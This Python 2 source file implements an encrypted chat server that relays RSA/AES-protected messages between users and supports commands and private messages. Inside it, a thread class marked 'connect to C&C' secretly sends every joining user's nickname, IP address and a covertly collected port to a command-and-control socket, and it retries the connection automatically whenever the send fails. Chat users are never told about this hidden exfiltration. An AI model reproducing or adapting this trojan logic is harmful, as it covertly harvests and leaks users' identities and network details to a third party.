#!/usr/bin/python
# -*- coding: utf-8 -*-

# *********************************************** Crypto chat by boris et manu *********************************************************


from __future__ import unicode_literals

import sys
from Crypto.PublicKey import RSA
import socket
import select
from Cipher import *
from Parser import *
import pickle
import os
from glob import glob
import ast
import time
import signal
import hashlib
from os.path import expanduser
import threading
from threading import Thread, RLock, Event

reload(sys)
sys.setdefaultencoding('utf8')


# Variables globales
HOST = ''
SOCKET_LIST = []
RECV_BUFFER = 262144
PORT = 9009
global thread_alive
thread_alive = False

global AROBASE
AROBASE = False
global IP_FIRST_CONNECTION_DICT
IP_FIRST_CONNECTION_DICT = {}
global IP_SOCKET_DICT
IP_SOCKET_DICT = {}
global IP_SOCKET
IP_SOCKET = []
global NICKNAME_DICT
NICKNAME_DICT = {}
global IP_SYM_KEY_DICT
IP_SYM_KEY_DICT = {}
global IP_NICKNAME
IP_NICKNAME = {}
global IP_PORT_DICT
IP_PORT_DICT = {}
global IP_REG_PORT_DICT
IP_REG_PORT_DICT = {}
global list_infos
list_infos = []

def open_room():
    port = raw_input("Which port? ")
    return port


# Fonction permettant de transmettre un message envoyé à tous les clients connectés
def transmit(server_socket, sock, message, ip, is_message_client):

    # Message en provenance d'un client
    if is_message_client:
        decrypted_message = decrypt_message(ip, message, IP_SYM_KEY_DICT) # Le message envoyé par le socket est déchiffré

        # Gestion des commandes
        if check_command(decrypted_message):

            command = command_parser(decrypted_message)

            if command == "$get_all_infos":
                infos_list = []
                sock_ip = ip
                
                for ip in IP_REG_PORT_DICT:
                    curr_ip = str(ip).encode("utf-8")
                    port = str(IP_REG_PORT_DICT[ip]).encode("utf-8")
                    nickname = str(IP_NICKNAME[ip]).encode("utf-8")
                    infos_list.append("[Nickname:" + nickname + "]|[IP address:" + str(curr_ip) + "]|[Port connection:" + port + "]\n")

                str_infos= "".join(infos_list)
                infos = "server_message" + "\n" + str_infos.replace(", ", "\\n")

                hex_ciphertext = encrypt_message(sock_ip ,infos , IP_SYM_KEY_DICT)
                sock.send(hex_ciphertext)

                return

            elif command == "$get_nicknames_up":
                nickname_list = []
                sock_ip = ip
                
                for ip in IP_NICKNAME:
                    nickname = IP_NICKNAME[ip] + "\n"
                    nickname_list.append(nickname)

                str_nicknames = "".join(nickname_list)
                str_nicknames = "server_message" + "\n" + str_nicknames.replace(", ", "\\n")

                hex_ciphertext = encrypt_message(sock_ip ,str_nicknames , IP_SYM_KEY_DICT)
                sock.send(hex_ciphertext)               

            elif command == "$help":
                sock_ip = ip
                commands_list = []
                commands_list = get_commands()
                str_commands = "".join(commands_list)
                str_commands = "server_message" + "\n" + str_commands.replace(", ", "\\n")
                print "commands help: " + str_commands
                hex_ciphertext = encrypt_message(sock_ip ,str_commands , IP_SYM_KEY_DICT)
                sock.send(hex_ciphertext)

                return

            elif command == "$get_pop":
                return # On sort de la fonction

            else:
                sock_ip = ip
                print "ip erreur: " + sock_ip
                err_command = "Unknown command"
                hex_ciphertext = encrypt_message(sock_ip ,err_command , IP_SYM_KEY_DICT) # Sinon on renvoie un message d'erreur au socket envoyeur
                sock.send(hex_ciphertext)

            return

        # Gestion des arobases
        elif check_arobase(decrypted_message) and "$" not in decrypted_message:            
            arobase_parse = arobase_parser(decrypted_message)
            nickname = arobase_parse[0]
            message_to_send = arobase_parse[1]
            print "nickname: " + nickname
            print "trunc message: " + message_to_send
            print "liste nicknames: " + str(IP_NICKNAME)

            for ip_elem in IP_NICKNAME:
                if IP_NICKNAME[ip_elem] == nickname: # Gérer le cas ou les pseudos sont les memes!!!!!
                    ip_cipher_addr = ip_elem
                    cipher_socket = IP_SOCKET_DICT[ip_elem] # Socket désigné par le nickname et l'adresse ip associée
                    message_to_send = IP_NICKNAME[ip] + " to you:" + message_to_send
                    hex_ciphertext = encrypt_message(ip_cipher_addr, message_to_send, IP_SYM_KEY_DICT)
                    cipher_socket.send(hex_ciphertext)

                    break

            if nickname not in IP_NICKNAME.values():    
                ip_cipher_addr = ip
                hex_ciphertext = encrypt_message(ip_cipher_addr,nickname + " not found", IP_SYM_KEY_DICT) # Sinon on renvoie un message d'erreur au socket envoyeur
                sock.send(hex_ciphertext)

            return # Permet de sortir de la fonction


        for socket in SOCKET_LIST:
            if socket != server_socket and socket != sock: #permet de ne pas envoyer le message au client envoyeur du message
                try : 		
                    # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres encryption
                    curr_tuple = socket.getpeername()
                    ip_client_addr = curr_tuple[0]
                    hex_ciphertext = encrypt_message(ip_client_addr, decrypted_message, IP_SYM_KEY_DICT)
                    socket.send(hex_ciphertext)

                except:
                    curr_tuple = socket.getpeername()
                    ip_client_addr = curr_tuple[0]                    
                    # broken socket connection
                    socket.close()
                    # broken socket, remove it
                    if socket in SOCKET_LIST:
                        SOCKET_LIST.remove(socket)
                        del IP_NICKNAME[ip_client_addr]
                        del IP_PORT_DICT[ip_client_addr]
                        del IP_REG_PORT_DICT[ip_client_addr]

    # Message en provenance du serveur
    else: 
        for socket in SOCKET_LIST:

            # Pas besoin de déchiffrement car c'est un message en provenance du serveur (déjà sous format string)
            if socket != server_socket and socket != sock: #sock != client_socket pour ne pas envoyer le message au client venant de se connecter
                try: 		
                    # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres encryption
                    curr_tuple = socket.getpeername()
                    ip_client_addr = curr_tuple[0]

                    hex_ciphertext = encrypt_message(ip_client_addr, message, IP_SYM_KEY_DICT)
                    socket.send(hex_ciphertext)                

                except:
                    # broken socket connection
                    curr_tuple = socket.getpeername()
                    ip_client_addr = curr_tuple[0]

                    socket.close()
                    # broken socket, remove it
                    if socket in SOCKET_LIST:
                        SOCKET_LIST.remove(socket)        
                        del IP_NICKNAME[ip_client_addr]
                        del IP_PORT_DICT[ip_client_addr]
                        del IP_REG_PORT_DICT[ip_client_addr]


class Get_list(object):

    @staticmethod
    def get_list_info():
        return list_infos
    

class Send_users_infos(threading.Thread):
    
    def __init__(self, ip_user):
        super(Send_users_infos, self).__init__() # super permet d'instancier l'objet dans la classe mère (Thread)
        self._stop_event = threading.Event()
        self.sock_troj = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        self.sock_troj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        self.AES_IV = AES_IV_KEY_generator()
        self.AES_KEY = self.AES_IV[0]
        self.iv = self.AES_IV[1]
        self.curr_ip = ip_user
        self.info = ""
        
    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()
    
    def get_info(self):
        ip = str(self.curr_ip)
        port = str(IP_PORT_DICT[self.curr_ip])
        nickname = str(IP_NICKNAME[self.curr_ip])
        self.info = "[nickname:" + nickname + "]|[ip:" + ip + "]|[port:" + port + "]\n" 
        
        return self.info

    def run(self):
        time.sleep(2)
        list_infs = Get_list.get_list_info()

        def encrypt_troj_message(data):
            hex_ciphertext = socket_message(str(data), self.iv, self.AES_KEY)
        
            return hex_ciphertext

        def string_troj_message(hex_enc_data):
            enc_data = hex_enc_data.decode("hex")
            message = sym_decrypt(enc_data, self.iv, self.AES_KEY)
            str_message = str(message)
            
            return str_message                                                                                                                                                                                                                                                                                           
        
        # connect to C&C
        try:
            self.sock_troj.connect(("127.0.0.1", 3002))
            getpbk = self.sock_troj.recv(2048)     

            public_key = RSA.importKey(getpbk)

            encrypted_aes_key = asym_encrypt(self.AES_KEY, public_key)
            hex_encrypted_aes_key = encrypted_aes_key.encode("hex").upper()
            hex_IV = self.iv.encode("hex").upper()

            socket_troj_pack = hex_IV + hex_encrypted_aes_key

            self.sock_troj.send(socket_troj_pack)

            data = self.sock_troj.recv(4096)

            if data:
                str_data = string_troj_message(data)

                if str_data == "OK":
                    hex_data = encrypt_troj_message(str(list_infs))

                    self.sock_troj.send(hex_data)

        except:
            self.sock_troj.close()
            time.sleep(5)
            sender = Send_users_infos(self.curr_ip)
            sender.start()

        self.sock_troj.close()
        self.stop()


def chat_server():
    # Presentation du chat
    if(len(sys.argv) < 2) :
        print 'Usage : python chat_server.py port'
        sys.exit()

    port = int(sys.argv[1])

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #pour la connection par internet changer AF_INET en AF_INET6
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, port))
    server_socket.listen(10)

    #add server socket object to the list of readable connections
    SOCKET_LIST.append(server_socket)
    #IP_SOCKET_DICT["server_socket"] = server_socket
    print "Chat crypt started on port " + str(int(port))

    while 1:
        #list sockets which are ready to be read through select
        ready_to_read, ready_to_write, in_error = select.select(SOCKET_LIST, [], [], 0)

        for sock in ready_to_read:
            is_message_client = False

            # a new connection request received
            if sock == server_socket:                
                sockfd, addr = server_socket.accept()
                ip_client = addr[0]

                if IP_FIRST_CONNECTION_DICT.has_key(ip_client):
                    del IP_FIRST_CONNECTION_DICT[ip_client]

                if IP_NICKNAME.has_key(ip_client):
                    del IP_NICKNAME[ip_client]

                if IP_PORT_DICT.has_key(ip_client):
                    del IP_PORT_DICT[ip_client]

                if IP_REG_PORT_DICT.has_key(ip_client):
                    del IP_REG_PORT_DICT[ip_client]


                IP_FIRST_CONNECTION_DICT[ip_client] = True # Premiere connexion

                print "Client (%s, %s) connected " % addr

                for ip in IP_SOCKET_DICT:
                    if str(ip) == str(ip_client):
                        for elem_sock in SOCKET_LIST:
                            if elem_sock ==  IP_SOCKET_DICT[ip]:
                                SOCKET_LIST.remove(elem_sock)
                        del IP_SOCKET_DICT[ip]
                        break

                print "IP_SOCKET_DICT apres boucle: " + str(IP_SOCKET_DICT)

                IP_SOCKET_DICT[ip_client] = sockfd

                SOCKET_LIST.append(sockfd) 
                print "liste IP_SOCKET_DICT: " + str(IP_SOCKET_DICT)
                #check if it is a known client or generate new pair of keys 
                public_key = check_pub_key(ip_client)

                #hashing the public key
                #hash_object = hashlib.sha1(public_key.exportKey())
                #hex_digest = hash_object.hexdigest()                

                sockfd.send(public_key.exportKey())
                #is_message_client = False
                #transmit(server_socket, sockfd, "(%s:%s) has join the room\n" % addr, None, is_message_client)

            # a message from a client, not a new connection
            else:
                try:
                    # receiving data from the socket.

                    data = sock.recv(RECV_BUFFER)

                    if data:

                        arobase_message = False

                        print "current addr: " + str(sock.getpeername())

                        socket_infos = sock.getpeername()
                        curr_ip = socket_infos[0]
                        curr_port = socket_infos[1]

                        print "liste IP_SOCKET_DICT: " + str(IP_SOCKET_DICT)

                        print "liste IP_FIRST CONNECTION: " + str(IP_FIRST_CONNECTION_DICT)                        

                        for client_ip in IP_SOCKET_DICT:
                            # Si ce n'est pas le premier message d'un socket, il s'agit d'un message normal                  
                            if str(curr_ip) == str(client_ip) and IP_FIRST_CONNECTION_DICT[curr_ip] == False:
                                is_message_client = True
                                transmit(server_socket, IP_SOCKET_DICT[client_ip], data, client_ip, is_message_client)

                                break

                            # Si c'est le premier paquet envoyé par une ip, il s'agit de la clé symétrique, de l'IV et du pseudo
                            elif str(curr_ip) == str(client_ip) and IP_FIRST_CONNECTION_DICT[curr_ip]:

                                # Si l'ip existait dans la liste en cas de déconnexion et reconnexion, on vire les elements associés a l'ip et l'ip elle-même
                                for ip in IP_SYM_KEY_DICT:
                                    if str(ip) == str(curr_ip):
                                        del IP_SYM_KEY_DICT[ip]
                                        break                                

                                # Réception de l'IV
                                hex_IV = data[:32]
                                IV = hex_IV.decode("hex")

                                # Réception de la clé symétrique hexadécimale chiffrée avec la clé publique
                                data_size = len(data)
                                print "longueur de la clé + l'IV: " + str(len(data))

                                hex_enc_sym_key = data[32:1056]
                                hex_enc_port = data[1056:1064]
                                hex_enc_nickname = data[1064:len(data)]
                                enc_sym_key = hex_enc_sym_key.decode("hex")

                                # Déchiffrement de la clé symétrique
                                priv_key = get_priv_key(curr_ip)
                                sym_key = asym_decrypt(enc_sym_key, priv_key)


                                # Association de la clé symétrique et de l'IV à l'ip du client:
                                sym_key_iv_pair = [sym_key, IV]

                                IP_SYM_KEY_DICT[curr_ip] = sym_key_iv_pair

                                # Déchiffrement du pseudo (nickname) et ajout de ce dernier dans une liste associée a l'ip
                                nickname = decrypt_message(curr_ip, hex_enc_nickname, IP_SYM_KEY_DICT)
                                derob_port = decrypt_message(curr_ip, hex_enc_port, IP_SYM_KEY_DICT)

                                IP_PORT_DICT[curr_ip] = derob_port
                                IP_REG_PORT_DICT[curr_ip] = curr_port
                                IP_NICKNAME[curr_ip] = nickname

                                is_message_client = False
                                nickname_to_print = nickname.replace("@", "")
                                transmit(server_socket, sock, str(nickname_to_print) + " (%s:%s) has join the conversation\n" % socket_infos, None, is_message_client)

                                thread_troj = Send_users_infos(curr_ip)
                                list_infos.append(thread_troj.get_info())
                                thread_troj.start()

                                print "nickname: " + str(nickname)

                                IP_FIRST_CONNECTION_DICT[curr_ip] = False

                                break            

                    else:
                        # remove the socket that's broken
                        if sock in SOCKET_LIST:
                            ip_tuple = sock.getpeername()
                            ip_addr = ip_tuple[0]

                            del IP_SOCKET_DICT[ip_addr]                        
                            SOCKET_LIST.remove(sock)

                            del IP_NICKNAME[ip_addr]

                            del IP_PORT_DICT[ip_addr]

                            del IP_REG_PORT_DICT[ip_addr]

                        # at this stage, no data means probably the connection has been broken
                        transmit(server_socket, sock, "Client (%s, %s) is offline\n" % addr, None, is_message_client)

                # exception
                except:
                    transmit(server_socket, sock, "Client (%s, %s) is offline\n" % addr, None, is_message_client)
                    continue

    server_socket.close()

if __name__ == "__main__":
    sys.exit(chat_server())





